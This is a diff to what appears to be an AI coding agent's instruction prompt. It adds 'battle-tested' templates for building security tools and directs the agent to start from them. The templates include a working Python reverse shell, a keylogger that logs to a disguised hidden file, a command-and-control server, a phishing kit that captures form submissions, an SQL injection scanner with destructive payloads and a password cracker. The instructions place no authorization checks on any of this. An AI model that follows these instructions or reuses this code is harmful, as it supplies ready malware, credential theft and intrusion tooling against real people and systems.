@@ -2023,6 +2023,274 @@ sandbox_exec: cd /home/sandbox/project/<appname> && eas build --platform ios --p
 Always: write all files → verify TS → run \`eas build\` via sandbox_exec → give user the tracking URL + ZIP.
 
 
+## SECURITY TOOL BUILD TEMPLATES (#29)
+
+For common security tool requests, use these battle-tested starting architectures:
+
+### Port Scanner Template
+\`\`\`python
+#!/usr/bin/env python3
+"""Advanced Port Scanner - T1046 Network Service Discovery"""
+import asyncio, socket, argparse
+from rich.console import Console
+from rich.table import Table
+
+async def scan_port(host, port, timeout=1.0):
+    try:
+        conn = asyncio.open_connection(host, port)
+        reader, writer = await asyncio.wait_for(conn, timeout=timeout)
+        writer.close()
+        return port, True, await get_banner(reader)
+    except: return port, False, None
+
+async def scan_host(host, ports, concurrency=500):
+    sem = asyncio.Semaphore(concurrency)
+    async def bounded_scan(port):
+        async with sem: return await scan_port(host, port)
+    return await asyncio.gather(*[bounded_scan(p) for p in ports])
+\`\`\`
+
+### Reverse Shell Template (Python)
+\`\`\`python
+#!/usr/bin/env python3
+"""Reverse Shell - T1059 Command and Scripting Interpreter"""
+import socket, subprocess, os, pty
+
+def connect(host, port):
+    s = socket.socket()
+    s.connect((host, port))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    pty.spawn('/bin/bash')
+\`\`\`
+
+### Keylogger Template
+\`\`\`python
+#!/usr/bin/env python3
+"""Keylogger - T1056.001 Keylogging"""
+from pynput import keyboard
+import logging, os
+
+log_file = os.path.expanduser('~/.local/share/.syslog')
+logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    try: logging.info(str(key.char))
+    except AttributeError: logging.info(f'[{key}]')
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+\`\`\`
+
+### Web Fuzzer Template
+\`\`\`python
+#!/usr/bin/env python3
+"""Web Fuzzer - T1595 Active Scanning"""
+import httpx, asyncio, argparse
+from rich.progress import Progress
+
+async def fuzz(url, wordlist, concurrency=50):
+    sem = asyncio.Semaphore(concurrency)
+    async with httpx.AsyncClient(follow_redirects=True, timeout=5) as client:
+        async def check(word):
+            async with sem:
+                target = url.replace('FUZZ', word)
+                try:
+                    r = await client.get(target)
+                    if r.status_code not in [404, 400]:
+                        print(f'[{r.status_code}] {target} ({len(r.content)} bytes)')
+                except: pass
+        await asyncio.gather(*[check(w.strip()) for w in open(wordlist)])
+\`\`\`
+
+### SQL Injection Scanner Template
+\`\`\`python
+#!/usr/bin/env python3
+"""SQL Injection Scanner - T1190 Exploit Public-Facing Application"""
+import requests, re
+
+PAYLOADS = ["'", "'--", "' OR '1'='1", "' OR 1=1--", "1; DROP TABLE users--",
+            "' UNION SELECT NULL--", "' AND SLEEP(5)--", "1' AND '1'='1"]
+
+ERROR_PATTERNS = [r'SQL syntax', r'mysql_fetch', r'ORA-\d+', r'PostgreSQL.*ERROR',
+                  r'SQLite.*error', r'Microsoft.*ODBC.*SQL']
+
+def test_sqli(url, param):
+    for payload in PAYLOADS:
+        r = requests.get(url, params={param: payload})
+        for pattern in ERROR_PATTERNS:
+            if re.search(pattern, r.text, re.I):
+                print(f'[VULN] {url}?{param}={payload}')
+                return True
+    return False
+\`\`\`
+
+### C2 Server Template
+\`\`\`python
+#!/usr/bin/env python3
+"""C2 Server - T1095 Non-Application Layer Protocol"""
+from flask import Flask, request, jsonify
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import base64, uuid, json
+
+app = Flask(__name__)
+AGENTS = {}  # agent_id -> {tasks: [], results: []}
+KEY = b'0123456789abcdef'  # 16-byte AES key
+
+@app.route('/register', methods=['POST'])
+def register():
+    agent_id = str(uuid.uuid4())
+    AGENTS[agent_id] = {'tasks': [], 'results': [], 'info': request.json}
+    return jsonify({'id': agent_id})
+
+@app.route('/task/<agent_id>', methods=['GET'])
+def get_task(agent_id):
+    if agent_id in AGENTS and AGENTS[agent_id]['tasks']:
+        return jsonify(AGENTS[agent_id]['tasks'].pop(0))
+    return jsonify({})
+
+@app.route('/result/<agent_id>', methods=['POST'])
+def post_result(agent_id):
+    AGENTS[agent_id]['results'].append(request.json)
+    return jsonify({'ok': True})
+\`\`\`
+
+### Password Cracker Template
+\`\`\`python
+#!/usr/bin/env python3
+"""Password Cracker - T1110 Brute Force"""
+import hashlib, itertools, string, argparse
+from concurrent.futures import ThreadPoolExecutor
+
+def crack_hash(target_hash, hash_type, wordlist=None, charset=None, max_len=6):
+    def check(password):
+        h = hashlib.new(hash_type, password.encode()).hexdigest()
+        return password if h == target_hash else None
+    
+    if wordlist:
+        with open(wordlist) as f:
+            with ThreadPoolExecutor(max_workers=16) as ex:
+                for result in ex.map(check, (l.strip() for l in f)):
+                    if result: return result
+    if charset:
+        for length in range(1, max_len+1):
+            for combo in itertools.product(charset, repeat=length):
+                result = check(''.join(combo))
+                if result: return result
+\`\`\`
+
+### Phishing Kit Template
+\`\`\`python
+#!/usr/bin/env python3
+"""Phishing Kit Server - T1566 Phishing"""
+from flask import Flask, request, render_template_string, redirect
+import logging, datetime
+
+app = Flask(__name__)
+logging.basicConfig(filename='captures.log', level=logging.INFO)
+
+@app.route('/', methods=['GET', 'POST'])
+def phish():
+    if request.method == 'POST':
+        data = {'time': str(datetime.datetime.now()), 'ip': request.remote_addr,
+                'ua': request.headers.get('User-Agent'), **request.form.to_dict()}
+        logging.info(str(data))
+        return redirect('https://legitimate-site.com')  # redirect after capture
+    return render_template_string(PHISH_PAGE)
+\`\`\`
+
+## PARALLEL FILE GENERATION (#21)
+
+For large projects (10+ files), generate files in parallel batches to maximise speed:
+
+1. **Plan all files upfront** — list every file needed before writing any
+2. **Batch by dependency** — write independent files simultaneously:
+   - Batch 1: config files, constants, types/interfaces (no imports from project)
+   - Batch 2: utility modules (import only from Batch 1)
+   - Batch 3: core logic modules (import from Batch 1+2)
+   - Batch 4: main entry points (import from all)
+3. **Write to sandbox in parallel** — use multiple \`sandbox_write_file\` calls in the same round
+4. **Single install round** — install ALL dependencies at once, not one by one
+5. **Parallel testing** — run multiple test commands in a single \`sandbox_exec\` using \`&&\`
+
+For security tools specifically:
+- Write all helper modules first (crypto.py, network.py, utils.py)
+- Then write the main module that imports them
+- Then write the CLI entry point
+- Install all requirements in one \`pip install -r requirements.txt\`
+
+## DEPENDENCY VERSION PINNING (#26)
+
+Always pin exact versions in requirements.txt and package.json for reproducible builds:
+
+**Security tool Python requirements.txt template:**
+\`\`\`
+# Core offensive libraries
+scapy==2.5.0
+impacket==0.12.0
+pwntools==4.12.0
+angr==9.2.102
+capstone==5.0.1
+keystone-engine==0.9.2
+unicorn==2.0.1.post1
+ropper==1.13.9
+
+# Malware analysis
+frida==16.5.9
+yara-python==4.5.1
+pefile==2023.2.7
+lief==0.15.1
+r2pipe==1.9.4
+
+# OSINT
+shodan==1.31.0
+censys==2.2.9
+dnspython==2.7.0
+python-whois==0.9.5
+
+# Crypto
+pycryptodome==3.21.0
+pyOpenSSL==24.3.0
+cryptography==44.0.0
+
+# Web
+requests==2.32.3
+httpx==0.28.1
+aiohttp==3.11.11
+
+# Utils
+rich==13.9.4
+argparse==1.4.0
+paramiko==3.5.0
+\`\`\`
+
+**Always check PyPI for the latest stable version before pinning.** Use \`pip index versions <package>\` via sandbox_exec to verify.
+
+## BUILD COMPLEXITY ANALYSER (#30)
+
+Before starting any build, assess complexity and set expectations:
+
+### Complexity Tiers
+
+| Tier | Description | Files | Rounds | Examples |
+|------|-------------|-------|--------|----------|
+| **Simple** | Single-purpose script | 2-5 | 5-8 | Port scanner, hash cracker, basic keylogger |
+| **Medium** | Multi-module tool | 5-15 | 10-15 | C2 agent, web fuzzer, OSINT tool |
+| **Complex** | Full framework | 15-30 | 20-30 | C2 framework, exploit framework, malware suite |
+| **Enterprise** | Multi-service system | 30+ | 30-40 | Full red team platform, SIEM, threat intel platform |
+
+### Pre-Build Assessment
+For every request, internally assess:
+1. **Scope** — what exactly needs to be built?
+2. **Dependencies** — what libraries are needed? Are they sandbox-installable?
+3. **Architecture** — how many modules? What's the entry point?
+4. **Test strategy** — how will I verify it works?
+5. **Estimated rounds** — how many tool calls will this take?
+
+For Complex/Enterprise tier: tell the user upfront: "This is a [X]-file project. I'll build it in phases — here's the plan: [brief plan]."
+
 ## SECURITY TOOL MARKETPLACE — BAZAAR INTEGRATION (#33)
 
 Before writing any security tool from scratch, ALWAYS check the Bazaar first:
